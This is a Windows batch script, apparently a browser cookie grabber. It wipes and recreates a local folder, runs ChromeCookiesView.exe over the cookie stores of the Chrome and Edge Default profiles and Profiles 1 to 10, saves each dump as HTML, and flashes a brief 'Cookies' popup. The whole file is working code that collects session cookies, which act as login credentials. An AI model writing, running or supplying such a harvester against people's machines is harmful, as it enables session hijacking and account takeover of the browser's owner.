rmdir /s /q cookies

md cookies
if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" /shtml "cookies\Chrome Default.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies" /shtml "cookies\Chrome Profile1.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies" /shtml "cookies\Chrome Profile2.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 3\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 3\Network\Cookies" /shtml "cookies\Chrome Profile3.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 4\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 4\Network\Cookies" /shtml "cookies\Chrome Profile4.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 5\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 5\Network\Cookies" /shtml "cookies\Chrome Profile5.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 6\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 6\Network\Cookies" /shtml "cookies\Chrome Profile6.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 7\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 7\Network\Cookies" /shtml "cookies\Chrome Profile7.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 8\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 8\Network\Cookies" /shtml "cookies\Chrome Profile8.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 9\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 9\Network\Cookies" /shtml "cookies\Chrome Profile9.html"

if exist "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 10\Network\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Profile 10\Network\Cookies" /shtml "cookies\Chrome Profile10.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" /shtml "cookies\Edge Default.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 1\Cookies" /shtml "cookies\Edge Profile1.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 2\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 2\Cookies" /shtml "cookies\Edge Profile2.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 3\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 3\Cookies" /shtml "cookies\Edge Profile3.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 4\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 4\Cookies" /shtml "cookies\Edge Profile4.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 5\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 5\Cookies" /shtml "cookies\Edge Profile5.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 6\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 6\Cookies" /shtml "cookies\Edge Profile6.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 7\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 7\Cookies" /shtml "cookies\Edge Profile7.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 8\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 8\Cookies" /shtml "cookies\Edge Profile8.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 9\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 9\Cookies" /shtml "cookies\Edge Profile9.html"

if exist "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 10\Cookies" ChromeCookiesView.exe /CookiesFile "C:\Users\%username%\AppData\Local\Microsoft\Edge\User Data\Profile 10\Cookies" /shtml "cookies\Edge Profile10.html"

msg * /time:3 Cookies